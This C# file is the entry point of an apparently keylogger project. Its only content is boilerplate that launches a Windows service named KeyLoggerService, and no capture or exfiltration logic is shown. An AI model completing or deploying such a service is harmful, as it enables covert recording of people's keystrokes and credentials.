using System.ServiceProcess;

namespace Keylogger
{
    public static class Program
    {
        public static void Main()
        {
            ServiceBase[] ServicesToRun;

            ServicesToRun = new ServiceBase[]
            {
                new KeyLoggerService()
            };

            ServiceBase.Run(ServicesToRun);
        }
    }
}